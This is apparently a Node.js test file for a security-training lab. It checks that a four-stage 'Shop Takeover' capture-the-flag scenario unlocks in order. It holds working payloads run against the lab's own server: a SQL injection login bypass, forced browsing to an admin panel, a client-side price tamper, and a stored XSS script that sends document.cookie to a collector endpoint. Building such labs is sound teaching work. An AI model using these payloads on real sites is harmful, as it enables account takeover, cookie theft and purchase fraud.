'use strict';
// Shop Takeover scenario: four real exploits chained in order, each one
// unlocking the next stage, with the scenario flag awarded only after the
// last. Tests share one booted server; the exploit chain runs on a single
// client because scenario progress is per session. No browser is available,
// so the xss/stored beacon is played end to end in a vm sandbox like the
// xss module tests do.
const test = require('node:test');
const assert = require('node:assert/strict');
const vm = require('node:vm');
const { client, bootLab, flagFromDb, capturedSet, FLAG_RE } = require('./helpers');

// Anchors whose visible text is exactly "Enter the challenge".
function enterLinks(html) {
  const out = [];
  for (const m of html.matchAll(/<a\b[^>]*href="([^"]+)"[^>]*>([\s\S]*?)<\/a>/gi)) {
    if (m[2].replace(/<[^>]*>/g, '').trim() === 'Enter the challenge') out.push(m[1]);
  }
  return out;
}

function hrefs(html) {
  return [...html.matchAll(/href="([^"]*)"/g)].map((m) => m[1].replace(/&amp;/g, '&'));
}

// ---------------------------------------------------------------- browser sim
// (same approach as tests/xss.test.js: run the page's live inline scripts and
// the injected payload in a vm sandbox with a stubbed DOM, then deliver the
// beacon the payload produced to the real collector).
const TAG_RE = /<(\/?)([a-zA-Z][^\s/>]*)((?:"[^"]*"|'[^']*'|[^>"'])*)>/g;

function liveScripts(html) {
  const src = html.replace(/<!--[\s\S]*?-->/g, '').replace(/<textarea\b[^>]*>[\s\S]*?<\/textarea>/gi, '');
  const out = [];
  TAG_RE.lastIndex = 0;
  let m;
  while ((m = TAG_RE.exec(src))) {
    if (m[1] === '/' || m[2].toLowerCase() !== 'script') continue;
    const i = src.slice(TAG_RE.lastIndex).search(/<\/script/i);
    const end = i >= 0 ? TAG_RE.lastIndex + i : src.length;
    if (!/\bsrc\s*=/.test(m[3])) out.push(src.slice(TAG_RE.lastIndex, end));
    TAG_RE.lastIndex = end;
  }
  return out;
}

function makeBrowser(cookie) {
  const calls = [];
  const errors = [];
  const els = {};
  const el = (id) => (els[id] = els[id] || {
    style: {}, textContent: '', innerHTML: '', hidden: true,
    getAttribute: () => '/xss/claim-status?v=none',
    querySelector: () => ({ style: {} }),
  });
  const ctx = {
    document: { cookie, getElementById: el },
    location: { hash: '', search: '' },
    fetch: (u) => { calls.push(String(u)); return Promise.resolve({ json: () => Promise.resolve({ captured: false }) }); },
    setInterval: () => 0,
    alert: () => { calls.push('ALERT'); },
    URLSearchParams,
    decodeURIComponent,
  };
  ctx.window = ctx;
  vm.createContext(ctx);
  const run = (code) => {
    try { vm.runInContext(code, ctx, { timeout: 1000 }); } catch (e) { errors.push(e.message); }
  };
  return {
    calls, errors, run,
    runPage: (html) => liveScripts(html).forEach(run),
    beacons: () => calls.filter((u) => u.startsWith('/xss/collect')),
  };
}

async function deliver(c, browser) {
  let last = null;
  for (const url of browser.beacons()) {
    const r = await c.get(url);
    if (r.status === 200) return r;
    last = r;
  }
  return last;
}

const beaconJs = (v, token = 'window.__px') => `fetch('/xss/collect?c='+document.cookie+'&v=${v}&n='+${token})`;

test('shop-takeover scenario', async (t) => {
  const { srv, dataDir } = await bootLab(t);
  const challengeFlag = (mod, id) => flagFromDb(dataDir, mod, id);
  const scenarioFlag = () => flagFromDb(dataDir, 'scenario', 'shop-takeover');
  // One student browser for the whole chain: scenario stages are per session.
  const chain = client(srv.base);

  // GETs the scenario page, asserting it renders cleanly every time.
  async function scenarioPage(c) {
    const r = await c.get('/scenarios/shop-takeover');
    assert.equal(r.status, 200, '/scenarios/shop-takeover must be 200');
    assert.ok(!r.text.includes('\u2014'), '/scenarios/shop-takeover: em dash');
    return r.text;
  }

  await t.test('GET /scenarios lists Shop Takeover', async () => {
    const c = client(srv.base);
    const { status, text } = await c.get('/scenarios');
    assert.equal(status, 200);
    assert.ok(!text.includes('\u2014'), 'em dash on /scenarios');
    assert.ok(text.includes('Shop Takeover'));
    assert.ok(/href="\/scenarios\/shop-takeover"/.test(text), 'index links to /scenarios/shop-takeover');
  });

  await t.test('fresh session: only stage 1 shows Enter the challenge, no flag, no em dash', async () => {
    const c = client(srv.base);
    const text = await scenarioPage(c);
    assert.equal((text.match(FLAG_RE) || []).length, 0, 'scenario flag must not leak before completion');
    const links = enterLinks(text);
    assert.equal(links.length, 1, 'only stage 1 is unlocked for a fresh session');
    assert.ok(links[0].includes('sqli'), 'stage 1 leads into the sqli challenge');
    assert.ok(!hrefs(text).some((h) => h.includes('idor')), 'stage 2 briefing link absent for a fresh session');
    assert.ok(!hrefs(text).some((h) => h.includes('bizlogic')), 'stage 3 briefing link absent for a fresh session');
    assert.ok(!hrefs(text).some((h) => h.includes('xss')), 'stage 4 briefing link absent for a fresh session');
  });

  await t.test('stage 1: real sqli/login-bypass exploit unlocks stage 2', async () => {
    const form = await chain.get('/sqli/login');
    assert.equal(form.status, 200);
    const hit = await chain.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(challengeFlag('sqli', 'login-bypass')), 'the bypass must capture the sqli flag');
    assert.ok((await capturedSet(chain)).includes('sqli:Login Bypass'), 'sqli:Login Bypass must be on the scoreboard');
    const links = enterLinks(await scenarioPage(chain));
    assert.equal(links.length, 2, 'stage 2 unlocked after stage 1');
    assert.ok(links[1].includes('idor'), 'stage 2 leads into the idor challenge');
  });

  await t.test('stage 2: real idor/admin exploit unlocks stage 3', async () => {
    const login = await chain.get('/idor/login/bob');
    assert.equal(login.status, 302, 'login as bob');
    const hit = await chain.get('/idor/admin');
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(challengeFlag('idor', 'admin')), 'forced browsing must capture the idor flag');
    assert.ok((await capturedSet(chain)).includes('idor:Unprotected Admin Panel'), 'idor:Unprotected Admin Panel must be on the scoreboard');
    const links = enterLinks(await scenarioPage(chain));
    assert.equal(links.length, 3, 'stage 3 unlocked after stage 2');
    assert.ok(links[2].includes('bizlogic'), 'stage 3 leads into the bizlogic challenge');
  });

  await t.test('stage 3: real bizlogic price-tamper exploit unlocks stage 4', async () => {
    const hit = await chain.post('/bizlogic/price-tamper/buy', { product_id: 'hoodie', price: '1' });
    assert.equal(hit.status, 200);
    assert.ok(hit.text.includes(challengeFlag('bizlogic', 'biz-price-tamper')), 'the tampered price must capture the bizlogic flag');
    assert.ok((await capturedSet(chain)).includes('bizlogic:Client-Side Price Tampering'), 'bizlogic:Client-Side Price Tampering must be on the scoreboard');
    const links = enterLinks(await scenarioPage(chain));
    assert.equal(links.length, 4, 'stage 4 unlocked after stage 3');
    assert.ok(links[3].includes('xss'), 'stage 4 leads into the xss challenge');
  });

  await t.test('stage 4: real xss/stored beacon exploit completes the scenario and awards the scenario flag', async () => {
    const post = await chain.post('/xss/guestbook', { author: 'mallory', body: `<script>${beaconJs('stored')}</script>` });
    assert.equal(post.status, 302);
    const page = await chain.get('/xss/guestbook');
    assert.equal(page.status, 200);
    const b = makeBrowser(chain.cookie());
    b.runPage(page.text);
    assert.deepEqual(b.errors, [], 'the payload and page scripts must run cleanly');
    assert.ok(b.beacons().length > 0, 'the stored payload must fire a collector beacon');
    const collect = await deliver(chain, b);
    assert.ok(collect, 'no beacon was accepted by the collector');
    assert.equal(collect.status, 200);
    assert.ok(collect.text.includes(challengeFlag('xss', 'stored')), 'the beacon must capture the xss flag');
    assert.ok((await capturedSet(chain)).includes('xss:Stored XSS'), 'xss:Stored XSS must be on the scoreboard');
    const text = await scenarioPage(chain);
    const flags = text.match(FLAG_RE) || [];
    assert.ok(flags.includes(scenarioFlag()), 'scenario page shows the captured scenario flag banner');
    assert.notEqual(scenarioFlag(), challengeFlag('xss', 'stored'), 'the scenario flag is distinct from the challenge flag');
  });

  await t.test('locked stages never leak their briefing link', async () => {
    const c = client(srv.base);
    assert.equal(enterLinks(await scenarioPage(c)).length, 1, 'fresh session: only stage 1 unlocked');
    // Solve stage 1 only: stage 3 must stay locked with no leaked link.
    await c.post('/sqli/login', { username: "' OR '1'='1' -- ", password: 'anything' });
    const text = await scenarioPage(c);
    assert.equal(enterLinks(text).length, 2, 'after stage 1: stage 2 unlocked, nothing more');
    const hs = hrefs(text);
    assert.ok(!hs.some((h) => h.includes('bizlogic')), 'stage 3 briefing link absent before stage 2 is done');
    assert.ok(!hs.some((h) => h.includes('xss')), 'stage 4 briefing link absent before stage 3 is done');
  });
});
